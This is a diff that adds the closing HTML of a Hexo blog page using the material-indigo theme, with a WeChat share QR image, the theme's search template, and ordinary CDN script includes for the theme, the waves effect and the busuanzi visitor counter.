+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3aQXIbMQwEwPz/005VTjlE2hmAlJNK70llySv2HghoiB8/4uvr15W8/v16dYfkW5J7Hrvw8PDwRkt/db3/zObRbN5N1oyHh4d3m7cvBq8eWbt7zx7Ty7/j4eHhfSsvaZqT0pK32u/vhoeHh/dv8fZBRlIS8PDw8P5mXrKtJ5FB8vVtmflQ1oKHh4cX884egH3m9bed7+Hh4f33vK/F1X59Eky0BeBhhXh4eHgXeG3o0MYKLb4NgqOQAg8PD+8obx+eJsdgbbhwKgLGw8PDu8HLf+QnUWk7TDB73HlogoeHh3eD9377btvc9lCqDTvqO+Dh4eFd480OwGab/oydtOAPAS4eHh7eNV6yiHYTn32ybaCj3wp4eHh4a14bSeS/8WfRRv46iX3x8PDw7vHaKGEWT8we1uxx4OHh4X2SlzTcp4KGIlYoA5GHYzA8PDy8BS8ZAthv9LNDrxZcTyLg4eHhLXjvm+aE3UYSSbC7KQx4eHh4n+HNDvJnd8ij2Lbd/0NLjYeHh3eUt9m486OpnDHbz+vDPDw8PLw1bxMNtG10sri2yX5YAx4eHt4F3tlxqHYTbw/YjgW7eHh4eAvebOtve/ZNm76KIfDw8PAu8NotfraUTcOdHNQVUxJ4eHh4C157BNU20Elp2ccTL1eFh4eHd4G3Lw/7wanZkdgqa8HDw8Nb8PLN+tQYQd7xtsNYDzNleHh4eId4s01/1ii3/xXVsbzi4eHh4R3ifZXXfjQqb6zz0DbKWvDw8PAO8fJrFr8mseym5MxGu/Dw8PD2vHbEaj9o1cYfSWEYVj88PDy8Ba8dhJpFvfcq2ENhwMPDw/tW3iZumH2yPfpaFQY8PDy8o7x84863/na4Kh/VwsPDw7vNy8OIWdvdHmLla3goXXh4eHgXeKcmtto2erbQGR4PDw/vEO8nGzCxhr+UgrwAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
